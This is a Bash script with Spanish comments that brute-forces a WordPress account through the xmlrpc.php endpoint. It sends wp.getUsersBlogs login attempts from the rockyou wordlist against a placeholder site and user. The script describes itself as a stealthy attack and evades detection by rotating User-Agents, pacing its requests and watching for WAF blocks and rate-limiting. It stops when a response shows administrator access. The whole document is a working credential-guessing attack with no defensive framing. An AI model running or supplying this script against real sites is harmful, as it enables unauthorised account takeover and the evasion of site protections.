#!/bin/bash

# Ctrl+C handler
function ctrl_c() {
    echo -e "\n[!] Interrumpido. Saliendo..."
    rm -f file.xml
    exit 1
}

trap ctrl_c SIGINT

# Configuración
target="https://test.es/xmlrpc.php"
username="test"
wordlist="/usr/share/wordlists/rockyou.txt"
delay=8  # segundos entre intentos (ajústalo si hay WAF)
max_response_time=6000  # milisegundos para sospechar de throttling/WAF

# Lista de User-Agents aleatorios
user_agents=(
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36"
  "Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/605.1.15 Version/15.0"
)


function create_xml() {
    local password="$1"
    cat <<EOF > file.xml
<?xml version="1.0"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param>
      <value><string>$username</string></value>
    </param>
    <param>
      <value><string>$password</string></value>
    </param>
  </params>
</methodCall>
EOF
}

echo "[~] Iniciando ataque sigiloso contra $target con usuario '$username'..."

while IFS= read -r password; do
    create_xml "$password"
    ua=${user_agents[$RANDOM % ${#user_agents[@]}]}

    start_time=$(date +%s%3N)  # Tiempo en milisegundos

    response=$(curl -s -A "$ua" -X POST "$target" \
        -H "Content-Type: text/xml" \
        --connect-timeout 10 \
        --max-time 15 \
        -d @file.xml)

    end_time=$(date +%s%3N)
    response_time=$((end_time - start_time))

    # Detección de bloqueo por WAF o baneos
    if echo "$response" | grep -qiE "denied|forbidden|cloudflare|blocked|access denied"; then
        echo -e "\n[!] Posible bloqueo o WAF detectado. Abortando."
        rm -f file.xml
        exit 1
    fi

    # Detección de respuestas vacías
    if [[ -z "$response" ]]; then
        echo -e "\n[!] Respuesta vacía. El servidor podría haber cerrado la conexión o bloqueado."
        rm -f file.xml
        exit 1
    fi

    # Detección de throttling o lentitud sospechosa
    if [[ "$response_time" -gt "$max_response_time" ]]; then
        echo -e "\n[!] Tiempo de respuesta alto (${response_time}ms). Posible rate-limiting."
    fi

    # Validación si el login fue exitoso
    if echo "$response" | grep -q "<name>isAdmin</name>"; then
        echo -e "\n[+] Contraseña encontrada: $password"
        rm -f file.xml
        exit 0
    fi

    sleep $delay

done < "$wordlist"

echo -e "\n[-] No se encontró ninguna contraseña válida."
rm -f file.xml